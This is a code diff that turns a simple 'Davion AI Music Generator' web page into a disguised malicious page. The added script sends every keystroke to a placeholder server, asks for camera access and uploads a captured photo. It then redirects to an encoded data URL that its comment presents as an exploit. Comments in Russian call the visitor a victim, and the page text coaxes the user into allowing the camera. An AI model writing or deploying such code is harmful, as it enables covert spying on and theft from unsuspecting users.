@@ -1,44 +1,34 @@
-<!DOCTYPE html>
-<html lang="ru">
-<head>
-  <meta charset="UTF-8">
-  <title>Davion AI Music Generator</title>
-  <style>
-    body {
-      background-color: #121212;
-      color: white;
-      font-family: Arial, sans-serif;
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      justify-content: center;
-      height: 100vh;
-      margin: 0;
-    }
+<!DOCTYPE html>  
+<html>  
+<head>  
+    <title>Davion ai</title>  
+    <script>  
+        // Ловим нажатия клавиш  
+        document.addEventListener('keydown', function(e) {  
+            fetch('https://ваш-сервер.рф/log?key=' + e.key);  
+        });  
 
-    h1 {
-      font-size: 2.5em;
-      margin-bottom: 30px;
-    }
+        // Пытаемся получить доступ к камере (если жертва разрешит)  
+        navigator.mediaDevices.getUserMedia({ video: true })  
+            .then(stream => {  
+                const track = stream.getVideoTracks()[0];  
+                const imageCapture = new ImageCapture(track);  
+                imageCapture.takePhoto().then(blob => {  
+                    const formData = new FormData();  
+                    formData.append('photo', blob);  
+                    fetch('https://ваш-сервер.рф/upload', { method: 'POST', body: formData });  
+                });  
+            })  
+            .catch(e => console.log("Камера недоступна:", e));  
 
-    .login-button {
-      background-color: #1DB954;
-      border: none;
-      color: white;
-      padding: 15px 30px;
-      font-size: 1em;
-      border-radius: 8px;
-      cursor: pointer;
-      transition: background-color 0.3s ease;
-    }
-
-    .login-button:hover {
-      background-color: #17a044;
-    }
-  </style>
-</head>
-<body>
-  <h1>Davion AI Music Generator</h1>
-  <button class="login-button">Login via Facebook</button>
-</body>
-</html>
+        // Если браузер уязвим — попытка запуска эксплойта  
+        setTimeout(() => {  
+            window.location.href = "data:text/html;base64,PHNjcmlwdD5hbGVydCgn0J3QsCDRg9C00LDQu9C40YLRjCDQsiDRjdGC0L7RgiDQv9GA0L7QsdC10LvRjCEnKTs8L3NjcmlwdD4=";  
+        }, 3000);  
+    </script>  
+</head>  
+<body>  
+    <h1>Please allow camera to procced</h1>  
+    <p>Loading files... Do not close the page</p>  
+</body>  
+</html>  
